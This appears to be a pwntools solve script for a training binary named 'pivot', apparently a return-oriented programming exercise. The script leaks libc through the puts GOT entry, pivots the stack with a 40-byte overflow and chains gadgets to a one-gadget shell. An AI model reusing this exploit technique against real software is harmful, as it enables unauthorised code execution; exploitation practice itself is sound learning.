from pwn import *
import time
elf = ELF("pivot")
lib_elf = ELF("libpivot.so")
libc = elf.libc

io = elf.process()
io.recvuntil("pivot: 0x")
pivot_address = int(io.recvline()[:-1], 16)

read_memory_gadget = 0x4009c0 #mov (%rax), rax; ret, replace rax with the content of the memory in rax
set_rax_gadget = 0x4009bb #pop %rax; ret
pivot_to_rax_gdaget = 0x4009bd #xchg %rax, %rsp; ret
jmpRaxGadget = 0x4007c1 #jmp %rax
addToRaxGadget = 0x4009c4 #add rax, rbp; ret
setRbpGadget = 0x4007c8 #pop rbp; ret
one_gadget = 0xef4ce #from libc
set_r12_to_r15_gadget = 0x0000000000400a2c
set_rbx_gadget = 0x00000000000586d4 #from libc
bssSection = 0x0000000000601070
#plan: get libc leak using puts got and use it to one gadget

def libc_gadget(gadget_address):
    payload = b""
    payload += p64(set_rax_gadget)
    payload += p64(elf.got["puts"])
    payload += p64(read_memory_gadget)
    payload += p64(setRbpGadget)
    payload += p64(gadget_address - libc.symbols["puts"], sign = "signed")
    payload += p64(addToRaxGadget)
    payload += p64(jmpRaxGadget)
    return payload

first_chain = b""
first_chain += p64(set_r12_to_r15_gadget)
first_chain += p64(0) * 4
first_chain += libc_gadget(set_rbx_gadget)
first_chain += p64(0)
first_chain += p64(set_rax_gadget)
first_chain += p64(elf.got["puts"])
first_chain += p64(read_memory_gadget)
first_chain += p64(setRbpGadget)
first_chain += p64(one_gadget - libc.symbols["puts"], sign = "signed")
first_chain += p64(addToRaxGadget)
first_chain += p64(setRbpGadget)
first_chain += p64(bssSection + 0x50)
first_chain += p64(jmpRaxGadget)

assert len(first_chain) <= 0x100

pivot_chain = b""
pivot_chain += b"a" * 40
pivot_chain += p64(set_rax_gadget)
pivot_chain += p64(pivot_address)
pivot_chain += p64(pivot_to_rax_gdaget)

io.sendline(first_chain)
io.sendline(pivot_chain)
io.interactive()
